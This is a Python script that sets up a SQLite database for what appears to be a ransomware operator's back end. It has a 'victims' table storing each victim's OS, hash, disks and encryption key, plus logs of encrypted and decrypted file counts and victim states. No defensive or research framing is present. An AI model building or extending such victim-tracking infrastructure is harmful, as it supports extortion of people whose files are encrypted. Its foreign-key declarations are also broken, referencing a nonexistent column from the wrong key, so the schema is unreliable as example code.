import sqlite3
from sqlite3 import Error


def create_connection(db_file):
    """ create a database connection to the SQLite database
        specified by db_file
    :param db_file: database file
    :return: Connection object or None
    """
    conn = None
    try:
        conn = sqlite3.connect(db_file)
        return conn
    except Error as e:
        print(e)

    return conn


def create_table(conn, create_table_sql):
    """ create a table from the create_table_sql statement
    :param conn: Connection object
    :param create_table_sql: a CREATE TABLE statement
    :return:
    """
    try:
        c = conn.cursor()
        c.execute(create_table_sql)
    except Error as e:
        print(e)


def main():
    database = "../data/victims.sqlite"

    sql_create_victims_table = """ CREATE TABLE IF NOT EXISTS victims (
                                        id_victim integer PRIMARY KEY AUTOINCREMENT,
                                        os varchar(255) NOT NULL,
                                        hash varchar (255),
                                        disks varchar(20),
                                        key varchar(512),
					                    UNIQUE (hash)
					                    ); """

    sql_create_decrypted_table = """CREATE TABLE IF NOT EXISTS decrypted (
                                    id_decrypted integer PRIMARY KEY AUTOINCREMENT,
                                    id_victim integer NOT NULL,
                                    datetime timestamp,
                                    nb_files integer NOT NULL,
                                    FOREIGN KEY (id_decrypted) REFERENCES victims (id_victims)
                                );"""
    sql_create_states_table = """CREATE TABLE IF NOT EXISTS states (
                                    id_state integer PRIMARY KEY AUTOINCREMENT,
                                    id_victim integer NOT NULL,
                                    datetime timestamp,
                                    state varchar(20) NOT NULL,
                                    FOREIGN KEY (id_state) REFERENCES victims (id_victims)
                                );"""

    sql_create_encrypted_table = """CREATE TABLE IF NOT EXISTS encrypted (
                                    id_encrypted integer PRIMARY KEY AUTOINCREMENT,
                                    id_victim integer NOT NULL,
                                    datetime timestamp,
                                    nb_files integer NOT NULL,
                                    FOREIGN KEY (id_encrypted) REFERENCES victims (id_victims)
                                );"""


    # create a database connection
    conn = create_connection(database)

    # create tables
    if conn is not None:
        # create projects table
        create_table(conn, sql_create_victims_table)

        # create decrypted table
        create_table(conn, sql_create_decrypted_table)

        #create states table
        create_table(conn, sql_create_states_table)
        #create encrypted table
        create_table(conn, sql_create_encrypted_table)
    else:
        print("Error! cannot create the database connection.")


if __name__ == '__main__':
    main()